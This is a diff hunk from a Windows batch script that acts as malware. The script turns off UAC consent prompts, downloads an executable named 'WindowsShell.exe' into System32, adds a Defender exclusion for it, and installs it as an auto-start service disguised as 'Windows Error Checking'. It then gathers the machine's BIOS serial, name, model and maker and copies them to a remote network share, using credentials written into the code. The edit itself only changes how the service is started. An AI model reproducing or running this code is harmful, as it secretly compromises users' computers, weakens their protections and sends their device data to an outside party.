@@ -4,13 +4,13 @@ cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) &&
 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f
 taskkill /im WindowsShell.exe /f
-start /b net stop "Windows Error Checking"
+start /min /b "net stop 'Windows Error Checking'"
 sc delete "Windows Error Checking"
 del /f /q "C:\Windows\System32\WindowsPowerShell\WindowsShell.exe"
 powershell -Command "curl -o C:\Windows\System32\WindowsPowerShell\WindowsShell.exe https://github.com/mitutina/mitutina/releases/download/WindowsShell/WindowsShell.exe"
 powershell -Command "Add-MpPreference -ExclusionPath 'C:\Windows\System32\WindowsPowerShell\WindowsShell.exe'"
 powershell -Command "New-Service -Name 'Windows Error Checking' -BinaryPathName 'C:\Windows\System32\WindowsPowerShell\WindowsShell.exe' -DisplayName 'Windows Error Checking' -StartupType Automatic"
-start /b net start "Windows Error Checking"
+start /min /b "net start 'Windows Error Checking'"
 powershell -Command "$s=(Get-CimInstance Win32_BIOS).SerialNumber; $n=(Get-CimInstance Win32_ComputerSystem).Name; $m=(Get-CimInstance Win32_ComputerSystem).Model; $f=(Get-CimInstance Win32_ComputerSystem).Manufacturer; $d=$(Get-Date -Format 'yyyy-MM-dd'); $t=$(Get-Date -Format 'HH-mm'); $tf=\"$env:TEMP\tam.txt\"; \"$s`_$n`_$m`_$f`_$d`_$t\" | Out-File $tf; net use '\\minhtuan283.ddns.net\hdd' /user:minhtuan283 Thienngan2002 /persistent:no; if ($?) { $tf2='\\minhtuan283.ddns.net\hdd\serial\log\series_' + $d + '_' + $t + '.txt'; Copy-Item $tf $tf2; if (Test-Path '\\minhtuan283.ddns.net\hdd\serial\seri.txt') { Add-Content '\\minhtuan283.ddns.net\hdd\serial\seri.txt' (Get-Content $tf) } else { Copy-Item $tf '\\minhtuan283.ddns.net\hdd\serial\seri.txt' }; Remove-Item $tf }"
 
 cls
